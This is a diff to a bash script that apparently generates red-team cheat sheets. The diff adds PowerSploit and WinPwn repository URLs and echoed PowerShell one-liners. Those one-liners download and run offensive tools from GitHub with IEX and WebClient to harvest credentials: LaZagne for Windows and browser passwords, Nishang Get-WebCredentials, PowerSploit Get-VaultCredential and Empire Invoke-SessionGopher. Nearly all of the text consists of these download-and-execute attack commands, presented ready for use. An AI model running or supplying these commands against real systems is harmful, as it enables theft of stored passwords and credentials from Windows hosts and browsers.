@@ -20,10 +20,12 @@ baseLDAP="";	#
 DC="";		#
 NS="IP";	#
 
-EmpireRepo="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/";
+EmpireRepo="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/";
 NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
 PentestFactoryRepo="https://raw.githubusercontent.com/pentestfactory/Invoke-DCSync/main/";
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
+PowerSploitRepo="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/";
+S3cur3Th1sSh1tRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/";
 
 iwr="IEX (iwr -usebasicparsing "
 DownloadMethod=""
@@ -489,10 +491,26 @@ echo -e "${IBLUE}NTDS${RESTORE}"
 echo -e "${YELLOW}# WIP${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Cached Domain Credentials${RESTORE}"
-echo -e "$iwr "\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
-
-
-
+echo -e "IEX (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Credentials From Web Browsers${RESTORE}"
+echo -e ""
+echo -e "IEX (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe browsers"
+echo -e "$iwr '$NishangRepo""Gather/Get-WebCredentials.ps1');Get-WebCredentials"
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Windows Credential Manager${RESTORE}"
+echo -e ""
+echo -e "IEX (New-Object Net.WebClient).DownloadFile("\"$LazagneRepo"\" , "\"\$pwd\\LaZagne.exe"\");cmd.exe /c LaZagne.exe windows"
+echo -e "$iwr $PowerSploitRepo"Exfiltration/Get-VaultCredential.ps1");Get-VaultCredential"
+echo -e ""
+echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
+echo -e ""
+echo -e "${LGREEN}Unsecured Credentials${RESTORE}"
+echo -e ""
+echo -e "${LGREEN}Credentials in Files${RESTORE}"
+echo -e "$iwr $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invoke-SessionGopher"
 echo -e ""
 echo -e "${LRED}└──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘${RESTORE}"
 
